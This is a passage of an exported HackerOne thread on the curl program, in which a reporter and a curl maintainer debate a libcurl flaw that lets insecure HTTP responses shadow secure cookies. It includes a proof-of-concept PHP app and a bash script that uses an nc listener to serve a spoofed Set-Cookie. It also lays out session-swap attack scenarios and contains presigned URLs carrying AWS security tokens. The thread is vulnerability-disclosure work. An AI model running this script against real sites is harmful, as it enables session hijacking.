+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16584867,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "After some more study the browser situation seems kind of ok after all. I initially though that one of the major browsers would have shared the libcurl bug of not preventing cookie overwriting, but it seems I somehow messed up the testing. All major browsers seem to work correctly.\n\nHere's a simple PoC php app that can be used to demonstrate the libcurl vulnerability:\n ```\n<?php\n\nini_set('session.cookie_httponly', 1);\nini_set('session.cookie_secure', 1);\n\nsession_start();\n\nif ($_GET['setuser'])\n{\n  $_SESSION['user'] = $_GET['setuser'];\n\n  $baseurl=strtok($_SERVER[\"REQUEST_URI\"], \"?\");\n  header(\"Location: $baseurl\", true, 302);\n\n  echo \"User set to \\\"\" . htmlentities($_SESSION['user']) .\"\\\"\\n\";\n}\nelse\n{\n  echo \"User is \\\"\". htmlentities($_SESSION['user']) .\"\\\"\\n\";\n}\n\n?>\n```\nAnd the script that can be test the vulnerability:\n```\n#!/bin/bash\n\n# Configuration for the PoC\nTARGET=\"somesite.tld\"\nTPATH=\"/sessionpoc.php\"\n\n# Don't touch after this line\n\nR=$RANDOM\nHACKERNAME=\"Hacker$R\"\nVICTIMNAME=\"Victim$R\"\n\necho \"Hacker's name is: $HACKERNAME\"\necho \"Victim's name is: $VICTIMNAME\"\n\ncurl -s -c tmpcookies$R.txt \"https://$TARGET$TPATH?setuser=$HACKERNAME\" >/dev/null\nSID=$(grep PHPSESSID tmpcookies$R.txt | awk -F '\\t' '{print $7}')\nrm tmpcookies$R.txt\n\necho \"Hacker's PHPSESSID $SID\"\n\necho \"1. Fetch URL: https://$TARGET$TPATH?setuser=$VICTIMNAME\"\necho \"2. Fetch URL: http://$TARGET:3333/\"\necho \"3. Fetch URL: https://$TARGET$TPATH repeatedly\"\n\nwhile true\ndo\n  echo -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: PHPSESSID=$SID; path=/; domain=$TARGET\\r\\nContent-Length: 0\\r\\n\\r\\n\" | nc -v -l -p 3333\ndone\n```\n\nStep 2 demonstrates that the insecure context can inject the attackers cookie into libcurl.\n\nWhen step 3 is repeated with `curl -c cookies.txt -b cookies.txt` libcurl cycles between the two cookie entries. Thus you will see it toggle between the two identities as well.\n\nDepending on the specifics of the application this can get a bit weird to exploit. Either way, the secure cookies can be overwritten from insecure context, which is the root cause of this vulnerability.\n\nIn situations where the configuration of the target server can be adjusted a mitigation for vulnerable libcurl versions is to use `__Host-` session cookies since this will block the `Set-Cookie` if `domain` is set (effectively blocking the attack vector).",
+            "automated_response": false,
+            "created_at": "2022-05-06T04:46:31.076Z",
+            "updated_at": "2022-05-06T04:46:31.076Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16585130,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I'm still not convinced.\n\n1. Having two cookies with the same name is not an error in cookie land and the order of them in not to be assumed\n2. Cookies don't check/verify protocols/port numbers so adding cookies in HTTP vs HTTPS has worked since the 90s\n\nThe question is therefore only if this issue describes a new trick that goes outside of what was always possible or not and if this new trick actually opens up for anything that wasn't already possible.",
+            "automated_response": false,
+            "created_at": "2022-05-06T05:48:50.614Z",
+            "updated_at": "2022-05-06T05:48:50.614Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16588491,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think this is a security issue because it allows any HTTP access at any time to override existing HTTPS set secure cookie.\n\nIn specific this violates the rule pointed out by dgustafsson:\n```\n   16.  If the cookie's secure-only-flag is false, and the scheme\n        component of request-uri does not denote a \"secure\" protocol,\n        then abort these steps and ignore the cookie entirely if the\n        cookie store contains one or more cookies that meet all of the\n        following criteria:\n\n        1.  Their name matches the name of the newly-created cookie.\n\n        2.  Their secure-only-flag is true.\n\n        3.  Their domain domain-matches the domain of the newly-created\n            cookie, or vice-versa.\n\n        4.  The path of the newly-created cookie path-matches the path\n            of the existing cookie.\n\n        Note: The path comparison is not symmetric, ensuring only that a\n        newly-created, non-secure cookie does not overlay an existing\n        secure cookie, providing some mitigation against cookie-fixing\n        attacks.  That is, given an existing secure cookie named 'a'\n        with a path of '/login', a non-secure cookie named 'a' could be\n        set for a path of '/' or '/foo', but not for a path of '/login'\n        or '/login/en'.\n```\n\nAll browsers implementing cookies adhere to this rule and reject the non-secure HTTP cookie attempting to override the Secure cookie already set.\n\nlibcurl *attempts* to do this, but fails. The code is here:\nhttps://github.com/curl/curl/blob/a8a1dd8ecc1e853953e7dcbca282c60454ffaaec/lib/cookie.c#L1039\n\nHowever, this checking is thwarted by the fact that the replacement logic is in the same loop. The replacement lookup and checking if the cookie \"overlay\" must be done separately since the search criteria are not the same.\n\nWhen separated the overlay check actually works and prevents the attack from working. See attached patch to see what I mean.",
+            "automated_response": false,
+            "created_at": "2022-05-06T09:41:51.863Z",
+            "updated_at": "2022-05-06T09:41:51.863Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1719150,
+                    "filename": "cookie-overlay-fix.patch",
+                    "type": "text/x-diff",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/imubxr3ezozz426nre0w5pk9njlm?response-content-disposition=attachment%3B%20filename%3D%22cookie-overlay-fix.patch%22%3B%20filename%2A%3DUTF-8%27%27cookie-overlay-fix.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a7c0a076bd21a41373b59ff4097967934eb6f04b168d0a16e614bba3881ea3fb"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16588504,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "It does not *override* it though. It adds one.",
+            "automated_response": false,
+            "created_at": "2022-05-06T09:43:41.670Z",
+            "updated_at": "2022-05-06T09:43:41.670Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16588586,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I see this as a variation of the old and known problem that you can set a cookie in a non-secure context that appears in the secure context, combined with the fact that you can have multiple cookies using the same name. Sure, this might also point out a bug, but does it really open a new attack surface?\n\nThe `__Secure-` prefix was introduced to cookies to *properly* address the problem with cookies going between secure/insecure context.",
+            "automated_response": false,
+            "created_at": "2022-05-06T09:49:48.322Z",
+            "updated_at": "2022-05-06T09:50:19.852Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16588736,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "> It does not override it though. It adds one.\n\nIt does override it in practice, however. In further processing libcurl will pick up whichever cookie happens to match first (which depends on the order of the entries in the list, and can change run to run when the file is updated).\n\n> I see this as a variation of the old and known problem that you can set a cookie in a non-secure context that appears in the secure context, combined with the fact that you can have multiple cookies using the same name.\n\nSure. This is what it is, but there is an attempt already in the libcurl code to prevent this specific attack scenario. This code is broken.\n\n> Sure, this might also point out a bug, but does it really open a new attack surface?\n\nIn my opinion it does, as demonstrated by this PoC and a proposed fix to prevent the attack from working.\n\nWith this fix the attacker must be able to inject their non-secure cookie *before* the secure one exists. This significantly reduces the window of opportunity for the attacker. This is exactly why the rule 16 was introduced in the first place, and why browsers also go into all these lengths to implement it. That's why libcurl also attempts to prevent this attack (but fails to do so currently).\n\n> The __Secure- prefix was introduced to cookies to properly address the problem with cookies going between secure/insecure context.\n\nYes, as well as `__Host-`.  In a perfect world all web applications would use all the available security features.\n\nUnfortunately libcurl can't do anything about existing services and web applications not using them. What libcurl can do is to make it as hard as possible to exploit the less secure applications. I think it should. libcurl already attempting to address this issue (even though it is failing to do so) seems to suggest that this has been considered important.\n\nI think I've laid our my reasoning in enough detail now.",
+            "automated_response": false,
+            "created_at": "2022-05-06T10:14:06.376Z",
+            "updated_at": "2022-05-06T10:14:06.376Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16589089,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I promised myself I had explained this in enough detail, but, eh. Couple of scenarios I want to provide which should perhaps clarify why I see this is a problem. Both of these scenarios *do* require Man in the Middle position (or alternatively a possibility to naturally host content on the target host.. which is somewhat less likely)\n\n*Scenario: Webshop*\n\nBackground: This web application is following the best practices and introduces a new session cookie on successful login. Thus it is not possible to perform classic \"session fixation\" attack where the attacker gains access to victims session. Yet, this can currently be exploited if libcurl is used.\n\n- Attacker logs on the webshop and fills a shopping cart with items\n- Victim logs on to a webshop and fills up a shopping cart\n- Victim starts a payment process. If the app fetches any resources over HTTP from the host, attacker is able to introduce `Set-Cookie` that replaces the cookie of the victim, and thus forces the app to use the attacker's session instead\n- Victim pays the attacker's shopping cart\n\n\n*Scenario: Cloud file storage service*\n\nBackground: This web application is following the best practices and introduces a new session cookie on successful login. Thus it is not possible to perform classic \"session fixation\" attack where the attacker gains access to victims session. Yet, this can currently be exploited if libcurl is used.\n\n- Attacker has created an account on the same service and is waiting for victim to access the service\n- Victim logs on the the file storage service\n- If the app fetches any resources over HTTP from the host, attacker is able to introduce `Set-Cookie` that replaces the cookie of the victim, and thus forces the app to use the attacker's session instead\n- Any uploads of sensitive information will be uploaded to account controlled by the attacker\n\nNeither of these scenarios would work if this vulnerability would be fixed.",
+            "automated_response": false,
+            "created_at": "2022-05-06T11:10:29.161Z",
+            "updated_at": "2022-05-06T11:18:59.397Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16589311,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Any non-TLS HTTP request is enough if the application either follows redirects or parses and processes further links (say for example browser loading resources from HTML pages). If redirects are followed the access can be pointed to http port on the target website or if links are followed a link to http port on the target site can be added.\n\nThe response to the forthcoming request can then be spoofed to perform the `Set-Cookie` attack as described.",
+            "automated_response": false,
+            "created_at": "2022-05-06T11:49:30.982Z",
+            "updated_at": "2022-05-06T11:54:14.627Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16677258,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "After much consideration.\n\nThe [security section of the 6265bis draft](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis/#section-8) - the in progress document that is supposed to (soon?) update [RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265), makes it clear that redirecting from a secure context (HTTPS) to an insecure one (HTTP) with the same host name is a known bad move and there are multiple documented ways that redirect can cause problems.\n\nThis exact problem is not included there of course because this is a bug, but a server that does this redirect opens itself for a slew of other cookie related risks already. Not to mention some more sever attacks than what is onlined here.\n\nThis attack relies on a successful MITM of an HTTP site (without affecting the HTTPS one) and careful timing, it also requires that the HTTPS site performs the taboo operation of redirecting over to its HTTP counterpart.\n\nSince this attack doesn't replace the HTTPS cookie, it also requires the attacked site not handle the duplicate (or handle it wrongly). It also requires that the added cookie value is all which is needed to trick the site, which basically means that prevention methods in use virtually everywhere like CSRF are circumvented or not used. Additionally, for a tricked payment, it basically requires that you're performing the attack 10 years ago given how the token auth flow is for payment providers these days (not to mention that the invoice address on the attackers shoppingcart won't match the card issued etc etc).\n\nGiven the amount of stars that need to be aligned for this to be the vector of an attack, you'd be far more likelier to use something else.\n\nThis is a bug, but we think labeling it with a CVE risks crying wolf and further water down the concept of what a CVE is.\n\nWe do not consider this a curl security vulnerability.\n",
+            "automated_response": false,
+            "created_at": "2022-05-12T21:26:05.815Z",
+            "updated_at": "2022-05-12T21:26:05.815Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22A